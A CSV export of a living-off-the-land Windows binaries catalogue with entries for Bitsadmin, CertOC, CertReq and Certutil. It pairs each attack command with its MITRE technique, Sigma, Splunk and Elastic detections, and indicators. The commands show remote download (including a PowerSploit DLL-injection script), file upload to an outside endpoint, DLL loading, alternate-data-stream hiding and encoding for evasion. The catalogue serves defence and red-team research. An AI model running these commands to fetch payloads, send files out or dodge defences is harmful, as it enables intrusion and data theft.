Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Bitsadmin.exe","Used for managing background intelligent transfer","Oddvar Moe","2018-05-25","bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset","Command for copying cmd.exe to another folder","Copy file","Copy","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\System32\bitsadmin.exe, C:\Windows\SysWOW64\bitsadmin.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/90ca1a8ad2e5c96d09a9ae4ff92483a2110d49ff/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/abcaf00aeef3769aa2a6f66f7fb6537b867c1691/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e40b8592544721c689f8ae96477ea1218e4c7a05/rules/windows/process_creation/win_monitoring_for_persistence_via_bits.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml, IOC: Child process from bitsadmin.exe, IOC: bitsadmin creates new files, IOC: bitsadmin adds data to alternate data stream","https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679, https://www.youtube.com/watch?v=_8xJaaQlpBo, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Rob Fuller (@mubix), Chris Gates (@carnal0wnage), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Bitsadmin/"
"Bitsadmin.exe","Used for managing background intelligent transfer","Oddvar Moe","2018-05-25","bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset","One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.","Execute binary file specified. Can be used as a defensive evasion.","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\System32\bitsadmin.exe, C:\Windows\SysWOW64\bitsadmin.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/90ca1a8ad2e5c96d09a9ae4ff92483a2110d49ff/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/abcaf00aeef3769aa2a6f66f7fb6537b867c1691/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e40b8592544721c689f8ae96477ea1218e4c7a05/rules/windows/process_creation/win_monitoring_for_persistence_via_bits.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml, IOC: Child process from bitsadmin.exe, IOC: bitsadmin creates new files, IOC: bitsadmin adds data to alternate data stream","https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679, https://www.youtube.com/watch?v=_8xJaaQlpBo, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Rob Fuller (@mubix), Chris Gates (@carnal0wnage), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Bitsadmin/"
"CertOC.exe","Used for installing certificates","Ensar Samil","2021-10-07","certoc.exe -LoadDLL ""C:\test\calc.dll""","Loads the target DLL file","Execute code within DLL file","Execute","User","T1218","Windows Server 2022","c:\windows\system32\certoc.exe, c:\windows\syswow64\certoc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/406f10b583469f7f7c245ff41002f75902693b7d/rules/windows/process_creation/process_creation_certoc_execution.yml, IOC: Process creation with given parameter, IOC: Unsigned DLL load via certoc.exe, IOC: Network connection via certoc.exe","https://twitter.com/sblmsrsn/status/1445758411803480072?s=20, https://twitter.com/sblmsrsn/status/1452941226198671363?s=20","Ensar Samil (@sblmsrsn)","http://localhost:4001/lolbas/Binaries/Certoc/"
"CertOC.exe","Used for installing certificates","Ensar Samil","2021-10-07","certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1","Downloads text formatted files","Download scripts, webshells etc.","Download","User","T1105","Windows Server 2022","c:\windows\system32\certoc.exe, c:\windows\syswow64\certoc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/406f10b583469f7f7c245ff41002f75902693b7d/rules/windows/process_creation/process_creation_certoc_execution.yml, IOC: Process creation with given parameter, IOC: Unsigned DLL load via certoc.exe, IOC: Network connection via certoc.exe","https://twitter.com/sblmsrsn/status/1445758411803480072?s=20, https://twitter.com/sblmsrsn/status/1452941226198671363?s=20","Ensar Samil (@sblmsrsn)","http://localhost:4001/lolbas/Binaries/Certoc/"
"CertReq.exe","Used for requesting and managing certificates","David Middlehurst","2020-07-07","CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt","Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory","Download file from Internet","Download","User","T1105","Windows 10, Windows 11","C:\Windows\System32\certreq.exe, C:\Windows\SysWOW64\certreq.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/eb8c9c046b86e7d412bdcc3235693fa1c00f70d6/rules/windows/process_creation/win_susp_certreq_download.yml, IOC: certreq creates new files, IOC: certreq makes POST requests","https://dtm.uk/certreq","David Middlehurst (@dtmsecurity)","http://localhost:4001/lolbas/Binaries/Certreq/"
"CertReq.exe","Used for requesting and managing certificates","David Middlehurst","2020-07-07","CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal","Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST","Upload","Upload","User","T1105","Windows 10, Windows 11","C:\Windows\System32\certreq.exe, C:\Windows\SysWOW64\certreq.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/eb8c9c046b86e7d412bdcc3235693fa1c00f70d6/rules/windows/process_creation/win_susp_certreq_download.yml, IOC: certreq creates new files, IOC: certreq makes POST requests","https://dtm.uk/certreq","David Middlehurst (@dtmsecurity)","http://localhost:4001/lolbas/Binaries/Certreq/"
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe","Download and save 7zip to disk in the current folder.","Download file from Internet","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe","Download and save 7zip to disk in the current folder.","Download file from Internet","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt","Download and save a PS1 file to an Alternate Data Stream (ADS).","Download file from Internet and save it in an NTFS Alternate Data Stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil -encode inputFileName encodedOutputFileName","Command to encode a file using Base64","Encode files to evade defensive measures","Encode","User","T1027","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
